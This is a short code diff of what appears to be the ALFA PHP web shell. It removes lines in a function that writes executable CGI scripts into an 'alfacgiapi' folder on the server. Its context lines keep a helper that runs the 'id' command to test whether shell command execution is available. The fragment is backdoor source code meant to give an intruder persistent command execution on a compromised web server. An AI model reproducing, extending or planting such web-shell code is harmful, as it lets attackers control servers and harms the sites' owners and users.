@@ -2107,9 +2107,6 @@ function alfaWriteTocgiapi($name, $source){
 		alfaCreateParentFolder();
 		@chdir($GLOBALS['home_cwd'] . "/" . __1337_DATA_FOLDER__);
 	}
-	@mkdir('alfacgiapi',0755);
-	__write_file("alfacgiapi/".$name, __get_resource($source));
-	@chmod("alfacgiapi/".$name, 0755);
 	return $temp;
 }
 function alfacheckcgi(){if(strlen(alfaEx("id",false,true,true))>0)echo("ok");else echo("no");}
